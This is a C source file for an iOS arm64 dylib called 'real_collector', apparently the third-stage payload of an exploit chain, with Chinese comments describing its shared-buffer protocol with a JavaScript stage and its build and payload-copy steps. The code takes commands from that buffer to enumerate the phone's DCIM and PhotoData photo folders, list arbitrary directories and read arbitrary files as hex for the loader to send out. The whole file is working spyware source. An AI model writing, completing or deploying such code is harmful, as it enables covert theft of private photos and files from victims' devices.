/*
 * real_collector.dylib.c
 * ----------------------
 * 独立数据回传 dylib（不依赖后台任务链）。
 * Stage3 加载后调用 _process(shared_buffer)。
 *
 * 协议 (与 Stage3_VariantB.js 一致):
 *   D[0] 状态字, D[1] 载荷长度, 偏移 8 起为 UTF-8 数据
 *   0 IDLE  1 URL  2 DL  3 READY  4 ERROR  5 EXIT  6 FEED(cmd)  7 POST
 *
 * 命令 (JS 写 STATE_FEED=6, 载荷 "cmd:..."):
 *   cmd:ping
 *   cmd:device_info
 *   cmd:list_dcim
 *   cmd:list_dir:/path
 *   cmd:read_file:/path
 *   cmd:exit
 *
 * 编译 (必须在 macOS / arm64 工具链):
 *   clang -arch arm64 -shared -Os -o real_collector.dylib \
 *     -Wl,-install_name,@rpath/real_collector.dylib \
 *     real_collector.dylib.c
 *   cp real_collector.dylib ../payloads/bootstrap.dylib
 */

#include <stdint.h>
#include <stddef.h>
#include <stdarg.h>
#include <string.h>
#include <stdbool.h>

#define STATE_IDLE  0
#define STATE_URL   1
#define STATE_DL    2
#define STATE_READY 3
#define STATE_ERROR 4
#define STATE_EXIT  5
#define STATE_FEED  6
#define STATE_POST  7

#define MAX_PAYLOAD (12 * 1024 * 1024)

extern void *dlopen(const char *path, int mode);
extern void *dlsym(void *handle, const char *symbol);

typedef void *(*fn_malloc)(size_t);
typedef void (*fn_free)(void *);
typedef void *(*fn_opendir)(const char *);
typedef void *(*fn_readdir)(void *);
typedef int (*fn_closedir)(void *);
typedef int (*fn_open)(const char *, int, ...);
typedef int (*fn_close)(int);
typedef long (*fn_read)(int, void *, size_t);
typedef int (*fn_access)(const char *, int);
typedef void (*fn_usleep)(unsigned int);
typedef int (*fn_snprintf)(char *, size_t, const char *, ...);
typedef int (*fn_vsnprintf)(char *, size_t, const char *, va_list);
typedef size_t (*fn_strlen)(const char *);
typedef int (*fn_strncmp)(const char *, const char *, size_t);
typedef int (*fn_strcmp)(const char *, const char *);

/* dirent (iOS arm64): d_ino 8, d_seekoff 8, d_reclen 2, d_namlen 2, d_type 1, d_name[] */
struct ios_dirent {
    uint64_t d_ino;
    uint64_t d_seekoff;
    uint16_t d_reclen;
    uint16_t d_namlen;
    uint8_t  d_type;
    char     d_name[1024];
};

static fn_malloc   p_malloc;
static fn_free     p_free;
static fn_opendir  p_opendir;
static fn_readdir  p_readdir;
static fn_closedir p_closedir;
static fn_open     p_open;
static fn_close    p_close;
static fn_read     p_read;
static fn_access   p_access;
static fn_usleep   p_usleep;
static fn_snprintf p_snprintf;
static fn_vsnprintf p_vsnprintf;
static fn_strlen   p_strlen;
static fn_strncmp  p_strncmp;
static fn_strcmp   p_strcmp;

static void *sym(const char *name) {
    return dlsym((void *)(intptr_t)-2, name); /* RTLD_DEFAULT */
}

static void init_api(void) {
    p_malloc   = (fn_malloc)sym("malloc");
    p_free     = (fn_free)sym("free");
    p_opendir  = (fn_opendir)sym("opendir");
    p_readdir  = (fn_readdir)sym("readdir");
    p_closedir = (fn_closedir)sym("closedir");
    p_open     = (fn_open)sym("open");
    p_close    = (fn_close)sym("close");
    p_read     = (fn_read)sym("read");
    p_access   = (fn_access)sym("access");
    p_usleep   = (fn_usleep)sym("usleep");
    p_snprintf = (fn_snprintf)sym("snprintf");
    p_vsnprintf = (fn_vsnprintf)sym("vsnprintf");
    p_strlen   = (fn_strlen)sym("strlen");
    p_strncmp  = (fn_strncmp)sym("strncmp");
    p_strcmp   = (fn_strcmp)sym("strcmp");
}

static uint8_t *payload_ptr(uint32_t *D) {
    return (uint8_t *)(D + 2);
}

static void buffer_set(uint32_t *D, const char *s, int len) {
    uint8_t *p = payload_ptr(D);
    int i;
    if (len < 0) {
        len = 0;
        if (s) while (s[len] && len < MAX_PAYLOAD - 1) len++;
    }
    if (len > MAX_PAYLOAD - 1) len = MAX_PAYLOAD - 1;
    for (i = 0; i < len; i++) p[i] = (uint8_t)s[i];
    p[len] = 0;
    D[1] = (uint32_t)len;
}

static void buffer_printf(uint32_t *D, const char *fmt, ...) {
    char tmp[65536];
    int n = 0;
    va_list ap;
    va_start(ap, fmt);
    if (p_vsnprintf)
        n = p_vsnprintf(tmp, sizeof(tmp), fmt, ap);
    else if (p_snprintf)
        n = p_snprintf(tmp, sizeof(tmp), "%s", fmt);
    va_end(ap);
    if (n < 0) n = 0;
    if (n >= (int)sizeof(tmp)) n = (int)sizeof(tmp) - 1;
    buffer_set(D, tmp, n);
}

static void respond_ready(uint32_t *D, const char *json) {
    buffer_set(D, json, -1);
    D[0] = STATE_READY;
}

static int is_media_name(const char *name) {
    int n;
    if (!name || !p_strlen) return 0;
    n = (int)p_strlen(name);
    if (n < 4) return 0;
    /* crude case-insensitive extension check */
    {
        char e0 = name[n - 4], e1 = name[n - 3], e2 = name[n - 2], e3 = name[n - 1];
        if (e0 == '.') {
            /* .jpg .png .mov .mp4 .gif .dng */
            if ((e1|32)=='j' && (e2|32)=='p' && (e3|32)=='g') return 1;
            if ((e1|32)=='p' && (e2|32)=='n' && (e3|32)=='g') return 1;
            if ((e1|32)=='m' && (e2|32)=='o' && (e3|32)=='v') return 1;
            if ((e1|32)=='m' && (e2|32)=='p' && (e3|32)=='4') return 1;
            if ((e1|32)=='g' && (e2|32)=='i' && (e3|32)=='f') return 1;
            if ((e1|32)=='d' && (e2|32)=='n' && (e3|32)=='g') return 1;
        }
    }
    if (n >= 5) {
        char e0 = name[n - 5], e1 = name[n - 4], e2 = name[n - 3], e3 = name[n - 2], e4 = name[n - 1];
        if (e0 == '.' && (e1|32)=='h' && (e2|32)=='e' && (e3|32)=='i' && (e4|32)=='c') return 1;
        if (e0 == '.' && (e1|32)=='j' && (e2|32)=='p' && (e3|32)=='e' && (e4|32)=='g') return 1;
    }
    return 0;
}

static void append_json_escape(char *out, int *pos, int cap, const char *s) {
    int i;
    for (i = 0; s && s[i] && *pos < cap - 2; i++) {
        char c = s[i];
        if (c == '"' || c == '\\') {
            if (*pos < cap - 3) {
                out[(*pos)++] = '\\';
                out[(*pos)++] = c;
            }
        } else if ((unsigned char)c < 0x20) {
            /* skip control */
        } else {
            out[(*pos)++] = c;
        }
    }
}

static void cmd_ping(uint32_t *D) {
    respond_ready(D,
        "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"ping\","
        "\"note\":\"dylib_alive\"}");
}

static void cmd_list_dir(uint32_t *D, const char *path) {
    char *out;
    int pos = 0;
    int cap = 256 * 1024;
    int count = 0;
    void *dir;

    if (!p_opendir || !p_readdir || !p_closedir || !p_malloc || !p_free) {
        respond_ready(D, "{\"ok\":false,\"error\":\"posix_api_missing\"}");
        return;
    }
    if (!path || !path[0]) {
        respond_ready(D, "{\"ok\":false,\"error\":\"empty_path\"}");
        return;
    }

    out = (char *)p_malloc((size_t)cap);
    if (!out) {
        respond_ready(D, "{\"ok\":false,\"error\":\"malloc_failed\"}");
        return;
    }

    pos = 0;
    /* header */
    {
        const char *h1 = "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"list_dir\",\"path\":\"";
        int i;
        for (i = 0; h1[i] && pos < cap - 8; i++) out[pos++] = h1[i];
        append_json_escape(out, &pos, cap, path);
        out[pos++] = '"';
        out[pos++] = ',';
        out[pos++] = '"';
        out[pos++] = 'e';
        out[pos++] = 'n';
        out[pos++] = 't';
        out[pos++] = 'r';
        out[pos++] = 'i';
        out[pos++] = 'e';
        out[pos++] = 's';
        out[pos++] = '"';
        out[pos++] = ':';
        out[pos++] = '[';
    }

    dir = p_opendir(path);
    if (!dir) {
        p_free(out);
        buffer_printf(D,
            "{\"ok\":false,\"error\":\"opendir_failed\",\"path\":\"%s\"}", path);
        D[0] = STATE_READY;
        return;
    }

    for (;;) {
        struct ios_dirent *ent = (struct ios_dirent *)p_readdir(dir);
        const char *name;
        int first;
        if (!ent) break;
        name = ent->d_name;
        if (!name || !name[0]) continue;
        if (name[0] == '.' && (name[1] == 0 || (name[1] == '.' && name[2] == 0))) continue;
        if (count >= 400) break;
        first = (count == 0);
        if (!first) {
            if (pos < cap - 2) out[pos++] = ',';
        }
        if (pos < cap - 2) out[pos++] = '"';
        append_json_escape(out, &pos, cap, name);
        if (pos < cap - 2) out[pos++] = '"';
        count++;
    }
    p_closedir(dir);

    if (pos < cap - 32) {
        const char *tail;
        char nbuf[32];
        int i, nl;
        out[pos++] = ']';
        out[pos++] = ',';
        out[pos++] = '"';
        out[pos++] = 'c';
        out[pos++] = 'o';
        out[pos++] = 'u';
        out[pos++] = 'n';
        out[pos++] = 't';
        out[pos++] = '"';
        out[pos++] = ':';
        if (p_snprintf)
            nl = p_snprintf(nbuf, sizeof(nbuf), "%d", count);
        else {
            nbuf[0] = '0'; nbuf[1] = 0; nl = 1;
        }
        for (i = 0; i < nl && pos < cap - 4; i++) out[pos++] = nbuf[i];
        out[pos++] = '}';
        out[pos] = 0;
    }

    buffer_set(D, out, pos);
    D[0] = STATE_READY;
    p_free(out);
}

static void cmd_list_dcim(uint32_t *D) {
    static const char *roots[] = {
        "/var/mobile/Media/DCIM",
        "/private/var/mobile/Media/DCIM",
        "/var/mobile/Media/PhotoData",
        "/private/var/mobile/Media/PhotoData",
        "/var/mobile/Media",
        "/tmp",
        NULL
    };
    char *out;
    int pos = 0;
    int cap = 512 * 1024;
    int total = 0;
    int r;

    if (!p_opendir || !p_readdir || !p_closedir || !p_malloc || !p_free) {
        respond_ready(D, "{\"ok\":false,\"error\":\"posix_api_missing\"}");
        return;
    }

    out = (char *)p_malloc((size_t)cap);
    if (!out) {
        respond_ready(D, "{\"ok\":false,\"error\":\"malloc_failed\"}");
        return;
    }

    {
        const char *h = "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"list_dcim\",\"files\":[";
        int i;
        for (i = 0; h[i] && pos < cap - 8; i++) out[pos++] = h[i];
    }

    for (r = 0; roots[r]; r++) {
        void *dir = p_opendir(roots[r]);
        if (!dir) continue;
        /* list subdirs / files one level */
        for (;;) {
            struct ios_dirent *ent = (struct ios_dirent *)p_readdir(dir);
            char subpath[768];
            void *sub;
            int i, n;
            if (!ent) break;
            if (!ent->d_name[0]) continue;
            if (ent->d_name[0] == '.') continue;

            /* if media file at this level */
            if (is_media_name(ent->d_name)) {
                if (total > 0 && pos < cap - 2) out[pos++] = ',';
                out[pos++] = '{';
                out[pos++] = '"'; out[pos++] = 'p'; out[pos++] = 'a'; out[pos++] = 't'; out[pos++] = 'h'; out[pos++] = '"'; out[pos++] = ':'; out[pos++] = '"';
                append_json_escape(out, &pos, cap, roots[r]);
                if (pos < cap - 2) out[pos++] = '/';
                append_json_escape(out, &pos, cap, ent->d_name);
                out[pos++] = '"';
                out[pos++] = '}';
                total++;
                if (total >= 300) break;
                continue;
            }

            /* open subfolder (e.g. 100APPLE) */
            if (p_snprintf)
                p_snprintf(subpath, sizeof(subpath), "%s/%s", roots[r], ent->d_name);
            else
                continue;
            sub = p_opendir(subpath);
            if (!sub) continue;
            for (;;) {
                struct ios_dirent *e2 = (struct ios_dirent *)p_readdir(sub);
                if (!e2) break;
                if (!e2->d_name[0] || e2->d_name[0] == '.') continue;
                if (!is_media_name(e2->d_name)) continue;
                if (total > 0 && pos < cap - 2) out[pos++] = ',';
                out[pos++] = '{';
                out[pos++] = '"'; out[pos++] = 'p'; out[pos++] = 'a'; out[pos++] = 't'; out[pos++] = 'h'; out[pos++] = '"'; out[pos++] = ':'; out[pos++] = '"';
                append_json_escape(out, &pos, cap, subpath);
                if (pos < cap - 2) out[pos++] = '/';
                append_json_escape(out, &pos, cap, e2->d_name);
                out[pos++] = '"';
                out[pos++] = ',';
                out[pos++] = '"'; out[pos++] = 'a'; out[pos++] = 'l'; out[pos++] = 'b'; out[pos++] = 'u'; out[pos++] = 'm'; out[pos++] = '"'; out[pos++] = ':'; out[pos++] = '"';
                append_json_escape(out, &pos, cap, ent->d_name);
                out[pos++] = '"';
                out[pos++] = '}';
                total++;
                if (total >= 300) break;
            }
            p_closedir(sub);
            if (total >= 300) break;
        }
        p_closedir(dir);
        if (total >= 300) break;
    }

    {
        char nbuf[48];
        int nl = 0, i;
        out[pos++] = ']';
        out[pos++] = ',';
        out[pos++] = '"'; out[pos++] = 'c'; out[pos++] = 'o'; out[pos++] = 'u'; out[pos++] = 'n'; out[pos++] = 't'; out[pos++] = '"'; out[pos++] = ':';
        if (p_snprintf) nl = p_snprintf(nbuf, sizeof(nbuf), "%d", total);
        else { nbuf[0] = '0'; nbuf[1] = 0; nl = 1; }
        for (i = 0; i < nl && pos < cap - 4; i++) out[pos++] = nbuf[i];
        out[pos++] = '}';
        out[pos] = 0;
    }

    buffer_set(D, out, pos);
    D[0] = STATE_READY;
    p_free(out);
}

static void cmd_read_file(uint32_t *D, const char *path) {
    int fd;
    char *hex;
    unsigned char *buf;
    int n, i, pos;
    int max_read = 64 * 1024;

    if (!p_open || !p_read || !p_close || !p_malloc || !p_free) {
        respond_ready(D, "{\"ok\":false,\"error\":\"posix_api_missing\"}");
        return;
    }
    if (!path || !path[0]) {
        respond_ready(D, "{\"ok\":false,\"error\":\"empty_path\"}");
        return;
    }
    if (p_access && p_access(path, 0) != 0) {
        buffer_printf(D, "{\"ok\":false,\"error\":\"not_found\",\"path\":\"%s\"}", path);
        D[0] = STATE_READY;
        return;
    }

    fd = p_open(path, 0); /* O_RDONLY */
    if (fd < 0) {
        buffer_printf(D, "{\"ok\":false,\"error\":\"open_failed\",\"path\":\"%s\"}", path);
        D[0] = STATE_READY;
        return;
    }
    buf = (unsigned char *)p_malloc((size_t)max_read);
    hex = (char *)p_malloc((size_t)max_read * 2 + 256);
    if (!buf || !hex) {
        if (buf) p_free(buf);
        if (hex) p_free(hex);
        p_close(fd);
        respond_ready(D, "{\"ok\":false,\"error\":\"malloc_failed\"}");
        return;
    }
    n = (int)p_read(fd, buf, (size_t)max_read);
    p_close(fd);
    if (n < 0) n = 0;

    pos = 0;
    {
        const char *h1 = "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"read_file\",\"path\":\"";
        int k;
        for (k = 0; h1[k]; k++) hex[pos++] = h1[k];
        append_json_escape(hex, &pos, max_read * 2 + 256, path);
        hex[pos++] = '"';
        hex[pos++] = ',';
        hex[pos++] = '"'; hex[pos++] = 's'; hex[pos++] = 'i'; hex[pos++] = 'z'; hex[pos++] = 'e'; hex[pos++] = '"'; hex[pos++] = ':';
        if (p_snprintf) {
            char nb[16];
            int nl = p_snprintf(nb, sizeof(nb), "%d", n);
            for (k = 0; k < nl; k++) hex[pos++] = nb[k];
        } else {
            hex[pos++] = '0';
        }
        hex[pos++] = ',';
        hex[pos++] = '"'; hex[pos++] = 'h'; hex[pos++] = 'e'; hex[pos++] = 'x'; hex[pos++] = '"'; hex[pos++] = ':'; hex[pos++] = '"';
    }
    for (i = 0; i < n; i++) {
        static const char H[] = "0123456789abcdef";
        hex[pos++] = H[buf[i] >> 4];
        hex[pos++] = H[buf[i] & 0xf];
    }
    hex[pos++] = '"';
    hex[pos++] = '}';
    hex[pos] = 0;

    buffer_set(D, hex, pos);
    D[0] = STATE_READY;
    p_free(buf);
    p_free(hex);
}

static void handle_cmd(uint32_t *D, const char *cmd) {
    if (!cmd) {
        respond_ready(D, "{\"ok\":false,\"error\":\"null_cmd\"}");
        return;
    }
    if (p_strcmp && p_strcmp(cmd, "ping") == 0) {
        cmd_ping(D);
        return;
    }
    if (p_strcmp && p_strcmp(cmd, "list_dcim") == 0) {
        cmd_list_dcim(D);
        return;
    }
    if (p_strncmp && p_strncmp(cmd, "list_dir:", 9) == 0) {
        cmd_list_dir(D, cmd + 9);
        return;
    }
    if (p_strncmp && p_strncmp(cmd, "read_file:", 10) == 0) {
        cmd_read_file(D, cmd + 10);
        return;
    }
    if (p_strcmp && p_strcmp(cmd, "device_info") == 0) {
        respond_ready(D,
            "{\"ok\":true,\"source\":\"real_collector\",\"cmd\":\"device_info\","
            "\"note\":\"use list_dcim for media paths\"}");
        return;
    }
    if (p_strcmp && p_strcmp(cmd, "exit") == 0) {
        D[0] = STATE_EXIT;
        return;
    }
    buffer_printf(D, "{\"ok\":false,\"error\":\"unknown_command\",\"cmd\":\"%s\"}", cmd);
    D[0] = STATE_READY;
}

/*
 * Stage3 入口: x0 = shared buffer (Uint32Array backing store)
 */
void _process(void *buffer) {
    uint32_t *D = (uint32_t *)buffer;
    uint8_t *payload = payload_ptr(D);

    init_api();

    /* 立即回一条真实“活着”的数据，不依赖任务系统 */
    respond_ready(D,
        "{\"ok\":true,\"source\":\"real_collector\",\"event\":\"boot\","
        "\"msg\":\"dylib_started\"}");

    while (1) {
        uint32_t st = D[0];

        if (st == STATE_EXIT)
            break;

        if (st == STATE_FEED) {
            /* cmd:xxx */
            if (payload[0] == 'c' && payload[1] == 'm' && payload[2] == 'd' && payload[3] == ':') {
                handle_cmd(D, (const char *)(payload + 4));
            } else {
                respond_ready(D, "{\"ok\":false,\"error\":\"expected_cmd_prefix\"}");
            }
        }

        if (p_usleep)
            p_usleep(5000);
        else {
            volatile int spin;
            for (spin = 0; spin < 50000; spin++) {}
        }
    }
}
